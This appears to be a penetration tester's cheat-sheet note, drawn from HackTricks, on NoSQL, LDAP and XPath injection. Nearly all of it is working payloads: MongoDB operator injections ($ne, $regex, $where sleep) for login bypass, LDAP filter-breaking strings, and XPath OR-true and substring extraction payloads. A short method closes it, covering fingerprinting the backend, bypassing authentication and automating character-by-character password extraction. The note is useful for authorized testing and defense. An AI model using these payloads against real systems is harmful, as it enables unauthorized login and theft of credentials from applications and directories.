# Moraa — NoSQL / LDAP / XPath injection

> HackTricks `nosql-injection`, `ldap-injection`, `xpath-injection`. Cross-ref [[sqli]] (same
> discipline, different query language), [[auth-oauth]] (auth-bypass variants below are the highest-yield use).

## NoSQL (MongoDB-style — by far the most common in modern APIs)
**Auth-bypass via operator injection (JSON body, not string concat — the classic miss):**
```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$regex": "^adm"}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
```
If the endpoint takes form-urlencoded and the framework auto-casts bracket notation to nested objects:
```
username=admin&password[$ne]=x
username[$regex]=^adm&password[$ne]=x
```
**Blind boolean/data extraction** (when no operator injection works but the value is regex-matched):
```
username=admin&password[$regex]=^a          → true/false response differs
username=admin&password[$regex]=^ab         → narrow down the real password char by char
```
**Time-based blind (server-side JS eval, e.g. `$where`):**
```json
{"$where": "sleep(5000)"}
{"username": "admin", "$where": "this.password.length > 0 && sleep(5000)"}
```
Confirm: any of the above returning a different result set / auth success / timing delta than a
control (`password:{"$ne":"__definitely_wrong__"}` should also match if injection works — the giveaway
is that almost ANY malformed non-string value bypasses a `===` string compare that MongoDB coerces).

## LDAP injection (enterprise directory / AD-backed login forms)
```
*                              → wildcard, matches everything
*)(&                          → close filter early, inject new clause
*)(uid=*))(|(uid=*            → classic auth-bypass filter break
admin)(&(password=*))         → force AND-true regardless of password
*)(|(objectclass=*)           → dump-everything style
```
**Blind boolean extraction** (attribute-by-attribute, character-by-character):
```
admin)(userPassword=a*)      admin)(userPassword=ab*)   ...
```
different response (found vs not-found) narrows the real value. Confirm the field feeds an LDAP
filter (not SQL) via error text (`LDAPException`, `javax.naming`) or by testing SQLi payloads failing
while `*` / `)(` variants change behavior.

## XPath injection (XML-backed auth/search — less common, same idea)
```
' or '1'='1                          →  classic OR-true
' or count(/*)=1 or 'a'='b            
'] | //user[username='admin' and 'a'='a
x' and substring(//user[position()=1]/password,1,1)='a
```
Blind, char-by-char extraction against `substring()`/`string-length()` predicates, same discipline as
blind SQLi ([[sqli]]) — automate with a small script once one boolean oracle is confirmed.

## Method (applies to all three)
1. Identify the backend (error messages, `Content-Type`, framework fingerprint, or just try each
   family's simplest bypass payload against a login form).
2. For auth bypass: **the JSON/object-injection form beats the string-injection form** — always try
   sending an operator/object where a plain string is expected before assuming the field is unreachable.
3. For data extraction: confirm ONE boolean oracle, then automate character-by-character (or use
   `NoSQLMap`/manual scripting) — don't hand-guess the whole string.
4. Report the exact backend query language identified and the working bypass/extraction payload.
